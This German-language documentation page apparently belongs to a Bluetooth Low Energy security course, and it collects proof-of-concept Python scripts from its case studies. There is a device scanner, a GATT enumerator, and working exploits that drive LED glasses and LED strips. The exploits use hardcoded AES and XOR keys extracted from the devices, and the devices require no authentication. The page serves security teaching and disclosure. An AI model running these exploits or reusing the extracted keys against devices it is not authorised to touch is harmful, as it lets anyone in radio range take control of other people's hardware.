---
sidebar_position: 1
title: "PoC Scripts"
---

# PoC Scripts

Hier findest du die **Proof-of-Concept-Skripte** aus den Fallstudien.

:::warning Rechtlicher Hinweis
Diese Skripte dienen ausschließlich **Bildungszwecken** und der Analyse **eigener Geräte**. Die Verwendung gegen fremde Systeme ohne Genehmigung ist strafbar.
:::

## Scanner

### Einfacher BLE-Scanner

```python
#!/usr/bin/env python3
"""
scanner.py - Einfacher BLE-Scanner mit blatann

Usage: python3 scanner.py [/dev/ttyACM0]
"""

import sys
from blatann import BleDevice
from blatann.utils import setup_logger

def main(serial_port="/dev/ttyACM0"):
    setup_logger(level="INFO")
    
    ble_device = BleDevice(serial_port)
    ble_device.configure()
    ble_device.open()
    
    print("🔍 Scanning for BLE devices (10s)...")
    print("-" * 60)
    
    found = {}
    
    def on_scan(sender, report):
        addr = str(report.peer_address)
        if addr not in found:
            name = report.advertise_data.local_name or "Unknown"
            found[addr] = name
            print(f"[NEW] {addr} | {name} | RSSI: {report.rssi}")
    
    ble_device.scanner.on_scan_received.register(on_scan)
    ble_device.scanner.start_scan().wait(timeout=10)
    
    print("-" * 60)
    print(f"✅ Found {len(found)} devices")
    
    ble_device.close()

if __name__ == "__main__":
    port = sys.argv[1] if len(sys.argv) > 1 else "/dev/ttyACM0"
    main(port)
```

## Service Discovery

### GATT-Enumeration

```python
#!/usr/bin/env python3
"""
service_discovery.py - GATT Service Enumeration

Usage: python3 service_discovery.py <MAC_ADDRESS> [/dev/ttyACM0]
"""

import sys
from blatann import BleDevice
from blatann.utils import setup_logger

def discover_services(target_addr, serial_port="/dev/ttyACM0"):
    setup_logger(level="INFO")
    
    ble_device = BleDevice(serial_port)
    ble_device.configure()
    ble_device.open()
    
    print(f"🔗 Connecting to {target_addr}...")
    peer = ble_device.connect(target_addr).wait(timeout=10)
    print("✅ Connected!")
    
    print("\n🔍 Discovering services...")
    peer.discover_services().wait(timeout=30)
    
    print("\n" + "=" * 60)
    print("GATT Database")
    print("=" * 60)
    
    for service in peer.database.services:
        print(f"\n📦 Service: {service.uuid}")
        print(f"   Handles: {service.start_handle} - {service.end_handle}")
        
        for char in service.characteristics:
            props = []
            if char.readable: props.append("READ")
            if char.writable: props.append("WRITE")
            if char.subscribable: props.append("NOTIFY/IND")
            
            print(f"   └─ Characteristic: {char.uuid}")
            print(f"      Handle: {char.value_handle}")
            print(f"      Properties: {', '.join(props)}")
            
            for desc in char.descriptors:
                print(f"      └─ Descriptor: {desc.uuid} @ {desc.handle}")
    
    peer.disconnect().wait()
    ble_device.close()

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <MAC_ADDRESS> [serial_port]")
        sys.exit(1)
    
    target = sys.argv[1]
    port = sys.argv[2] if len(sys.argv) > 2 else "/dev/ttyACM0"
    discover_services(target, port)
```

## LED Glasses PoC

### Vollständiges PoC für LED-Brille

```python
#!/usr/bin/env python3
"""
glasses_poc.py - LED Glasses Control PoC

Demonstriert die Sicherheitslücken:
- Hardcoded AES-128 Key
- Keine Authentifizierung
- Column-Major AES Transformation

Usage: python3 glasses_poc.py --text "HELLO" --device "GLASSES-12B008"
"""

import sys
import time
import argparse
from Crypto.Cipher import AES
from blatann import BleDevice

# === EXTRACTED AES KEY ===
AES_KEY = bytes.fromhex("34522a5b7a6e492c08090a9d8d2a23f8")

# === BLE UUIDs ===
SERVICE_UUID = "0000fff0-0000-1000-8000-00805f9b34fb"
CHAR_CONTROL = "d44bc439-abfd-45a2-b575-925416129600"
CHAR_DATA = "d44bc439-abfd-45a2-b575-92541612960a"
CHAR_NOTIFY = "d44bc439-abfd-45a2-b575-925416129601"

# === Display Modes ===
MODES = {
    'static': (1, 0),
    'scroll-left': (2, 0),
    'scroll-right': (2, 1),
}

class ColumnMajorAES:
    """AES with column-major byte transformation (as in libAES.so)"""
    
    def __init__(self, key):
        self.key = key
    
    def _transform(self, data, to_col_major=True):
        if len(data) != 16:
            raise ValueError("Data must be 16 bytes")
        result = bytearray(16)
        for i in range(16):
            if to_col_major:
                row, col = i % 4, i // 4
                result[col + row * 4] = data[i]
            else:
                row, col = i // 4, i % 4
                result[i] = data[col + row * 4]
        return bytes(result)
    
    def encrypt(self, data):
        col_major = self._transform(data, True)
        cipher = AES.new(self.key, AES.MODE_ECB)
        encrypted = cipher.encrypt(col_major)
        return self._transform(encrypted, False)

# Character font data (abbreviated)
FONT = {
    'H': bytes([0x7F, 0x00, 0x7F, 0x00, 0x08, 0x00, 0x08, 0x00, 0x7F, 0x00, 0x00, 0x00]),
    'E': bytes([0x7F, 0x00, 0x7F, 0x00, 0x49, 0x00, 0x49, 0x00, 0x00, 0x00]),
    'L': bytes([0x7F, 0x00, 0x7F, 0x00, 0x01, 0x00, 0x01, 0x00, 0x00, 0x00]),
    'O': bytes([0x3E, 0x00, 0x7F, 0x00, 0x41, 0x00, 0x3E, 0x00, 0x00, 0x00]),
    ' ': bytes([0x00, 0x00, 0x00, 0x00]),
}

def encode_text(text):
    result = bytearray()
    for char in text.upper():
        result.extend(FONT.get(char, FONT[' ']))
    return bytes(result)

def send_text(peer, text, mode='static'):
    cipher = ColumnMajorAES(AES_KEY)
    
    # Find characteristics
    ctrl = peer.database.find_characteristic(CHAR_CONTROL)
    data = peer.database.find_characteristic(CHAR_DATA)
    
    # Encode text
    encoded = encode_text(text)
    size = len(encoded)
    
    # ATATS command
    atats = bytes([7, 65, 84, 65, 84, 83, 1, size >> 8, size & 0xFF])
    atats = atats + b'\x00' * (16 - len(atats))
    ctrl.write(cipher.encrypt(atats)).wait()
    time.sleep(0.5)
    
    # Data packets
    offset = 0
    while offset < size:
        chunk_size = min(15, size - offset)
        chunk = bytes([chunk_size]) + encoded[offset:offset+chunk_size]
        chunk = chunk + b'\x00' * (16 - len(chunk))
        data.write(cipher.encrypt(chunk)).wait()
        offset += chunk_size
        time.sleep(0.05)
    
    # ATCP command
    atcp = bytes([5, 65, 84, 67, 80]) + b'\x00' * 11
    ctrl.write(cipher.encrypt(atcp)).wait()
    time.sleep(0.5)
    
    # MODE command
    mode_val, move = MODES.get(mode, (1, 0))
    mode_cmd = bytes([6, 0x4D, 0x4F, 0x44, 0x45, mode_val, move])
    mode_cmd = mode_cmd + b'\x00' * (16 - len(mode_cmd))
    ctrl.write(cipher.encrypt(mode_cmd)).wait()
    
    print(f"✅ Text '{text}' sent with mode '{mode}'!")

# Full script continues with connection logic...
```

## LED Strips PoC

### XOR-basierte Steuerung

```python
#!/usr/bin/env python3
"""
led_strips_poc.py - LED Strips Control PoC

Demonstriert die Sicherheitslücken:
- Hardcoded XOR Key (trivial breakable)
- Keine Authentifizierung
- Predictable command structure

Usage: python3 led_strips_poc.py
"""

# === HARDCODED XOR KEY ===
XOR_KEY = bytes([89, 76, 90, 75, 53, 49, 33, 41, 62, 72, 64, 
                 118, 100, 98, 81, 68, 94, 68, 63])

class XORCipher:
    def __init__(self, counter=0):
        self.key = XOR_KEY + bytes([counter])
    
    def encrypt(self, data):
        result = bytearray(data)
        for i in range(1, min(len(result), 25)):
            for k in self.key:
                result[i] ^= k
        return bytes(result)
    
    decrypt = encrypt  # XOR is symmetric

class LEDController:
    CMD_PREFIX = 0x7E
    CMD_SUFFIX = 0xEF
    
    def __init__(self):
        self.counter = 0
    
    def _build_cmd(self, *args):
        return bytes([self.CMD_PREFIX] + list(args) + [self.CMD_SUFFIX])
    
    def _encrypt(self, cmd):
        cipher = XORCipher(self.counter)
        self.counter = (self.counter + 1) % 256
        return cipher.encrypt(cmd)
    
    def power(self, on=True):
        state = 0x01 if on else 0x00
        cmd = self._build_cmd(0x04, 0x04, state, 0x00, state, 0xFF, 0x00)
        return self._encrypt(cmd)
    
    def set_color(self, r, g, b):
        cmd = self._build_cmd(0x07, 0x05, 0x03, r, g, b, 0x10)
        return self._encrypt(cmd)
    
    def set_brightness(self, level):
        cmd = self._build_cmd(0x04, 0x01, level, 0xFF, 0xFF, 0xFF, 0x00)
        return self._encrypt(cmd)

# Demo
if __name__ == "__main__":
    ctrl = LEDController()
    
    print("Generated Commands:")
    print(f"Power On:   {ctrl.power(True).hex()}")
    print(f"Set Red:    {ctrl.set_color(255, 0, 0).hex()}")
    print(f"Bright 50%: {ctrl.set_brightness(50).hex()}")
```

## Download

Die vollständigen Skripte kannst du hier herunterladen:

- [scanner.py](/downloads/scripts/scanner.py)
- [service_discovery.py](/downloads/scripts/service_discovery.py)
- [glasses_poc.py](/downloads/scripts/glasses_poc.py)
- [led_strips_poc.py](/downloads/scripts/led_strips_poc.py)
- [waage_poc.py](/downloads/scripts/waage_poc.py)

---

:::tip Nächster Schritt
Siehe [Templates](./templates) für Report-Vorlagen.
:::
